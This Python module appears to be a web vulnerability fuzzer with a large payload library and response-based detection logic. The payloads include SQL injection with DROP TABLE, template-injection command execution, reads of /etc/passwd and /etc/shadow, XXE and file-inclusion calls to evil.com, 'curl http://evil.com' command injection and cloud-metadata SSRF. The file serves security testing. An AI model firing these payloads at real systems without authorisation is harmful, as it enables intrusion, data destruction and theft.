"""
Advanced Fuzzer - Comprehensive Vulnerability Testing
Integrates InjectX-style payloads with intelligent testing
"""

import logging
import time
import hashlib
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass


@dataclass
class FuzzResult:
    """Result of a fuzzing attempt"""
    vulnerable: bool
    vulnerability_type: str
    confidence: str
    payload: str
    evidence: str
    baseline_hash: str
    test_hash: str


class AdvancedFuzzer:
    """
    Comprehensive fuzzer with extensive payload library
    Tests for: SQLi, XSS, SSTI, LFI/RFI, Path Traversal, XXE, Command Injection, LDAP, etc.
    """

    def __init__(self):
        self.payloads = self._initialize_payloads()

    def _initialize_payloads(self) -> Dict[str, List[str]]:
        """Initialize comprehensive payload library"""
        return {
            'sql_injection': [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--",
                "1' ORDER BY 1--+",
                "1' ORDER BY 2--+",
                "1' ORDER BY 3--+",
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT database()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "1; DROP TABLE users--",
                "1'; DROP TABLE users--",
                "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
                "admin' AND 1=0 UNION ALL SELECT 'admin', 'admin'",
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,MD5('A'))--",
                "1' WAITFOR DELAY '0:0:5'--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND pg_sleep(5)--",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
                "<svg><script>alert&#40;'XSS'&#41;</script>",
                "<img src=`xx`onerror=alert`XSS`>",
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            ],
            'template_injection': [
                "{{7*7}}",
                "{{7*'7'}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "#{7*7}",
                "*{7*7}",
                "{{config}}",
                "{{self}}",
                "{{config.items()}}",
                "${class.getClassLoader()}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{request}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.class.mro()[1].subclasses()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
                "<%=7*7%>",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "${{<%[%'\"}}%\\",
                "{{1336+1}}",
                "{{1336*1337}}",
            ],
            'path_traversal': [
                "../",
                "..\\",
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%5c..%5c..%5cwindows%5cwin.ini",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//windows//win.ini",
                "/etc/passwd",
                "\\windows\\win.ini",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..;/..;/..;/etc/passwd",
                "..//..//..//etc/passwd",
                "....\\....\\....\\windows\\win.ini",
                "/etc/shadow",
                "/etc/hosts",
                "/proc/self/environ",
                "C:\\boot.ini",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "../../../../../../../etc/passwd%00",
                "../../../../../../../../windows/win.ini%00",
                "/var/www/html/index.php",
            ],
            'lfi_rfi': [
                "file:///etc/passwd",
                "file://C:/windows/win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "expect://id",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "http://evil.com/shell.txt",
                "https://evil.com/shell.txt",
                "ftp://evil.com/shell.txt",
                "\\\\evil.com\\share\\shell.txt",
                "php://filter/read=string.rot13/resource=index.php",
                "zip://archive.zip#shell.php",
                "phar://archive.phar/shell.php",
                "glob:///etc/passwd",
                "/proc/self/cmdline",
                "/proc/self/stat",
                "/proc/self/status",
                "/proc/self/fd/0",
            ],
            'xxe': [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]>",
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/passwd'>]><data>&file;</data>",
                "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
                "<!DOCTYPE replace [<!ENTITY example 'Doe'> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>",
            ],
            'command_injection': [
                "; ls",
                "| ls",
                "& ls",
                "&& ls",
                "|| ls",
                "; id",
                "| id",
                "& id",
                "&& id",
                "|| id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; whoami",
                "| whoami",
                "$(whoami)",
                "`whoami`",
                "; sleep 5",
                "| sleep 5",
                "$(sleep 5)",
                "`sleep 5`",
                "; ping -c 10 127.0.0.1",
                "| ping -c 10 127.0.0.1",
                "; curl http://evil.com",
                "| curl http://evil.com",
                "'; system('id'); '",
                "\"; system('id'); \"",
                "'; exec('id'); '",
                "\"; exec('id'); \"",
            ],
            'ssrf': [
                "http://localhost",
                "http://127.0.0.1",
                "http://0.0.0.0",
                "http://[::1]",
                "http://127.0.0.1:80",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "file:///etc/passwd",
                "dict://localhost:11211/stats",
                "gopher://localhost:25/xHELO",
                "http://localhost/admin",
                "http://127.0.0.1/admin",
                "http://0177.0.0.1",
                "http://2130706433",
            ],
            'ldap_injection': [
                "*",
                "*)(&",
                "*)(uid=*))(|(uid=*",
                "admin*",
                "admin*)((|userPassword=*)",
                "*)(objectClass=*",
                "*)(&(objectClass=*",
            ],
            'nosql_injection': [
                "' || '1'=='1",
                "' || 1==1//",
                "' || 1==1%00",
                "admin' || 'a'=='a",
                "';return true;var foo='",
                "';while(true){};var foo='",
                "1'; return true; var dum='",
                "{\"$ne\": 1}",
                "{\"$gt\": \"\"}",
                "{\"$regex\": \".*\"}",
            ],
            'crlf_injection': [
                "%0d%0aSet-Cookie:test=value",
                "%0d%0aLocation:http://evil.com",
                "%0aSet-Cookie:test=value",
                "\r\nSet-Cookie:test=value",
                "\nSet-Cookie:test=value",
                "%0d%0a%0d%0a<html><body>XSS</body></html>",
            ],
            'open_redirect': [
                "//evil.com",
                "///evil.com",
                "////evil.com",
                "https://evil.com",
                "//google.com",
                "https:evil.com",
                "//evil%E3%80%82com",
                "/\\/evil.com",
                "/evil.com",
            ],
        }

    def test_parameter(self, base_response: str, test_response: str,
                      payload: str, vulnerability_type: str) -> FuzzResult:
        """
        Analyze responses to determine if vulnerability exists

        Args:
            base_response: Baseline response content
            test_response: Response with injected payload
            payload: The payload used
            vulnerability_type: Type of vulnerability being tested

        Returns:
            FuzzResult object with findings
        """
        try:
            # Create hashes for comparison
            baseline_hash = hashlib.md5(base_response.encode()).hexdigest()
            test_hash = hashlib.md5(test_response.encode()).hexdigest()

            # Check for exact match (no change)
            if baseline_hash == test_hash:
                return FuzzResult(
                    vulnerable=False,
                    vulnerability_type=vulnerability_type,
                    confidence='N/A',
                    payload=payload,
                    evidence='Response unchanged',
                    baseline_hash=baseline_hash,
                    test_hash=test_hash
                )

            # Vulnerability-specific detection
            vulnerable, confidence, evidence = self._detect_vulnerability(
                base_response, test_response, payload, vulnerability_type
            )

            return FuzzResult(
                vulnerable=vulnerable,
                vulnerability_type=vulnerability_type,
                confidence=confidence,
                payload=payload,
                evidence=evidence,
                baseline_hash=baseline_hash,
                test_hash=test_hash
            )

        except Exception as e:
            logging.error(f"Error testing parameter: {str(e)}")
            return FuzzResult(
                vulnerable=False,
                vulnerability_type=vulnerability_type,
                confidence='ERROR',
                payload=payload,
                evidence=str(e),
                baseline_hash='',
                test_hash=''
            )

    def _detect_vulnerability(self, base_response: str, test_response: str,
                            payload: str, vuln_type: str) -> Tuple[bool, str, str]:
        """
        Detect specific vulnerability types

        Returns:
            Tuple of (vulnerable, confidence, evidence)
        """
        evidence_list = []

        # SQL Injection detection
        if vuln_type == 'sql_injection':
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'ora-', 'mssql',
                'sqlite', 'warning: mysql', 'unclosed quotation mark',
                'quoted string not properly terminated', 'syntax error',
                'microsoft ole db provider for sql server',
                'microsoft sql native client', 'odbc sql server driver',
                'jdbc', 'ora-01756', 'pg_query()', 'mysql_fetch',
                'sqlstate', 'db2 sql error', 'dynamic sql error'
            ]
            for error in sql_errors:
                if error.lower() in test_response.lower() and error.lower() not in base_response.lower():
                    evidence_list.append(f"SQL error: {error}")
                    return True, 'HIGH', '; '.join(evidence_list)

        # XSS detection
        elif vuln_type == 'xss':
            if payload in test_response and payload not in base_response:
                evidence_list.append(f"Payload reflected: {payload[:50]}")
                return True, 'HIGH', '; '.join(evidence_list)

        # Template Injection detection
        elif vuln_type == 'template_injection':
            # Check for mathematical evaluation
            if '49' in test_response and '{{7*7}}' in payload:
                evidence_list.append("Template math evaluation: 7*7=49")
                return True, 'HIGH', '; '.join(evidence_list)
            if '1337' in test_response and ('1336' in payload or '1337' in payload):
                evidence_list.append("Template math evaluation detected")
                return True, 'HIGH', '; '.join(evidence_list)

        # Path Traversal / LFI detection
        elif vuln_type in ['path_traversal', 'lfi_rfi']:
            indicators = [
                'root:x:0:0:', 'daemon:', '[boot loader]', '[operating systems]',
                '<?php', 'for 16-bit app support', 'extension=',
                '[mail function]', 'mysql.default_socket'
            ]
            for indicator in indicators:
                if indicator.lower() in test_response.lower() and indicator.lower() not in base_response.lower():
                    evidence_list.append(f"File inclusion: {indicator}")
                    return True, 'CRITICAL', '; '.join(evidence_list)

        # XXE detection
        elif vuln_type == 'xxe':
            if 'root:x:0:0:' in test_response or '<!DOCTYPE' in test_response:
                evidence_list.append("XXE response detected")
                return True, 'CRITICAL', '; '.join(evidence_list)

        # Command Injection detection
        elif vuln_type == 'command_injection':
            cmd_outputs = ['uid=', 'gid=', 'groups=', 'root:', 'www-data', 'bin/bash']
            for output in cmd_outputs:
                if output in test_response and output not in base_response:
                    evidence_list.append(f"Command execution: {output}")
                    return True, 'CRITICAL', '; '.join(evidence_list)

        # SSRF detection
        elif vuln_type == 'ssrf':
            ssrf_indicators = ['ami-id', 'instance-id', 'local-hostname', 'metadata']
            for indicator in ssrf_indicators:
                if indicator in test_response.lower():
                    evidence_list.append(f"SSRF indicator: {indicator}")
                    return True, 'HIGH', '; '.join(evidence_list)

        # Response length difference
        len_diff = abs(len(test_response) - len(base_response))
        if len_diff > 100:
            evidence_list.append(f"Significant response difference: {len_diff} bytes")
            return True, 'MEDIUM', '; '.join(evidence_list)

        return False, 'LOW', 'No clear vulnerability indicators'

    def get_payloads_for_type(self, vuln_type: str) -> List[str]:
        """Get payloads for specific vulnerability type"""
        return self.payloads.get(vuln_type, [])

    def get_all_vulnerability_types(self) -> List[str]:
        """Get list of all supported vulnerability types"""
        return list(self.payloads.keys())
